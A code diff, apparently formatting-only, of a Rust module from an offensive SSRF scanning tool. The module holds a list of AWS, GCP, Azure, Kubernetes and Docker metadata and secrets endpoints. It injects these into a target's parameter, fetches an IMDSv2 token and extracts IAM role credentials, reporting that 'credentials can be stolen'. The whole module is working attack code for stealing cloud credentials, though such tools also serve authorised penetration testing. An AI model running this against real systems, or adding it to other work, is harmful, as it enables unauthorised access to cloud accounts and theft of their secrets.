@@ -259,23 +259,65 @@ pub async fn scan(
 }
 
 const IMDSV2_BYPASS_URLS: &[(&str, &str)] = &[
-    ("AWS IMDSv2 token endpoint", "http://169.254.169.254/latest/api/token"),
-    ("AWS IMDSv2 metadata (with token)", "http://169.254.169.254/latest/meta-data/"),
+    (
+        "AWS IMDSv2 token endpoint",
+        "http://169.254.169.254/latest/api/token",
+    ),
+    (
+        "AWS IMDSv2 metadata (with token)",
+        "http://169.254.169.254/latest/meta-data/",
+    ),
     ("AWS IPv6 IMDS", "http://[fd00:ec2::254]/latest/meta-data/"),
     ("AWS IPv6 token", "http://[fd00:ec2::254]/latest/api/token"),
     ("AWS user-data", "http://169.254.169.254/latest/user-data/"),
-    ("AWS IAM creds", "http://169.254.169.254/latest/meta-data/iam/security-credentials/"),
-    ("AWS identity doc", "http://169.254.169.254/latest/dynamic/instance-identity/document"),
-    ("GCP project ID", "http://metadata.google.internal/computeMetadata/v1/project/project-id"),
-    ("GCP SA token", "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"),
-    ("GCP SSH keys", "http://metadata.google.internal/computeMetadata/v1/project/attributes/ssh-keys"),
-    ("GCP user-data", "http://metadata.google.internal/computeMetadata/v1/instance/attributes/user-data"),
-    ("Azure instance", "http://169.254.169.254/metadata/instance?api-version=2021-02-01"),
-    ("Azure token", "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"),
-    ("Azure attested", "http://169.254.169.254/metadata/attested/document?api-version=2018-10-01"),
-    ("K8s SA secrets", "https://kubernetes.default.svc/api/v1/namespaces/default/secrets"),
-    ("K8s SA config", "https://kubernetes.default.svc/api/v1/namespaces/default/serviceaccounts/default"),
-    ("Docker socket", "http://localhost:2375/v1.41/containers/json"),
+    (
+        "AWS IAM creds",
+        "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
+    ),
+    (
+        "AWS identity doc",
+        "http://169.254.169.254/latest/dynamic/instance-identity/document",
+    ),
+    (
+        "GCP project ID",
+        "http://metadata.google.internal/computeMetadata/v1/project/project-id",
+    ),
+    (
+        "GCP SA token",
+        "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
+    ),
+    (
+        "GCP SSH keys",
+        "http://metadata.google.internal/computeMetadata/v1/project/attributes/ssh-keys",
+    ),
+    (
+        "GCP user-data",
+        "http://metadata.google.internal/computeMetadata/v1/instance/attributes/user-data",
+    ),
+    (
+        "Azure instance",
+        "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
+    ),
+    (
+        "Azure token",
+        "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/",
+    ),
+    (
+        "Azure attested",
+        "http://169.254.169.254/metadata/attested/document?api-version=2018-10-01",
+    ),
+    (
+        "K8s SA secrets",
+        "https://kubernetes.default.svc/api/v1/namespaces/default/secrets",
+    ),
+    (
+        "K8s SA config",
+        "https://kubernetes.default.svc/api/v1/namespaces/default/serviceaccounts/default",
+    ),
+    (
+        "Docker socket",
+        "http://localhost:2375/v1.41/containers/json",
+    ),
     ("Docker socket (v2)", "http://localhost:2376/v1.41/info"),
 ];
 
@@ -285,11 +327,18 @@ pub async fn cloud_v2(
     token: Option<&str>,
     timeout: u64,
 ) -> anyhow::Result<()> {
-    println!("{} SSRF Cloud Metadata v2 (IMDSv2 Bypass)", "[*]".cyan().bold());
+    println!(
+        "{} SSRF Cloud Metadata v2 (IMDSv2 Bypass)",
+        "[*]".cyan().bold()
+    );
     println!("{}", "=".repeat(60).cyan());
     println!("{} URL:   {}", "[*]".cyan().bold(), url);
     println!("{} Param: {}", "[*]".cyan().bold(), param);
-    println!("{} Testing {} metadata endpoints", "[*]".cyan().bold(), IMDSV2_BYPASS_URLS.len());
+    println!(
+        "{} Testing {} metadata endpoints",
+        "[*]".cyan().bold(),
+        IMDSV2_BYPASS_URLS.len()
+    );
     println!("{}", "-".repeat(60).dimmed());
 
     let client = build_client(timeout, token);
@@ -327,15 +376,13 @@ pub async fn cloud_v2(
                 } else {
                     format!("status {}", status)
                 };
-                println!(
-                    "  {} {:40} status={} {}",
-                    "*".cyan(),
-                    name,
-                    status,
-                    tag
-                );
+                println!("  {} {:40} status={} {}", "*".cyan(), name, status, tag);
                 if interesting {
-                    println!("    {} {}", ">".red().bold(), body.chars().take(200).collect::<String>());
+                    println!(
+                        "    {} {}",
+                        ">".red().bold(),
+                        body.chars().take(200).collect::<String>()
+                    );
                     extracted.push((*name, body.chars().take(300).collect::<String>()));
                 }
             }
@@ -345,7 +392,10 @@ pub async fn cloud_v2(
         }
     }
 
-    println!("\n{} Attempting IMDSv2 token fetch + metadata access...", "[*]".cyan().bold());
+    println!(
+        "\n{} Attempting IMDSv2 token fetch + metadata access...",
+        "[*]".cyan().bold()
+    );
     let token_url = "http://169.254.169.254/latest/api/token";
     let test_url = if url.contains("{ssrf}") {
         url.replace("{ssrf}", token_url)
@@ -360,7 +410,11 @@ pub async fn cloud_v2(
     {
         Ok(resp) if resp.status().as_u16() == 200 => {
             let imds_token = resp.text().await.unwrap_or_default();
-            println!("  {} IMDSv2 token obtained: {}...", "[!]".red().bold(), &imds_token[..imds_token.len().min(40)]);
+            println!(
+                "  {} IMDSv2 token obtained: {}...",
+                "[!]".red().bold(),
+                &imds_token[..imds_token.len().min(40)]
+            );
 
             let meta_url = "http://169.254.169.254/latest/meta-data/iam/security-credentials/";
             let test_meta = if url.contains("{ssrf}") {
@@ -376,7 +430,11 @@ pub async fn cloud_v2(
             {
                 Ok(resp) if resp.status().as_u16() == 200 => {
                     let body = resp.text().await.unwrap_or_default();
-                    println!("  {} IAM role: {}", "[!]".red().bold(), body.chars().take(200).collect::<String>());
+                    println!(
+                        "  {} IAM role: {}",
+                        "[!]".red().bold(),
+                        body.chars().take(200).collect::<String>()
+                    );
                     extracted.push(("IAM Role (via IMDSv2)", body));
                 }
                 _ => {
@@ -385,7 +443,10 @@ pub async fn cloud_v2(
             }
         }
         _ => {
-            println!("  {} IMDSv2 token fetch failed — IMDSv2 may be enforced", "[-]".yellow());
+            println!(
+                "  {} IMDSv2 token fetch failed — IMDSv2 may be enforced",
+                "[-]".yellow()
+            );
         }
     }
 
@@ -396,7 +457,10 @@ pub async fn cloud_v2(
         IMDSV2_BYPASS_URLS.len()
     );
     if !extracted.is_empty() {
-        println!("{} Cloud metadata is accessible — credentials can be stolen!", "[!]".red().bold());
+        println!(
+            "{} Cloud metadata is accessible — credentials can be stolen!",
+            "[!]".red().bold()
+        );
     }
     Ok(())
 }
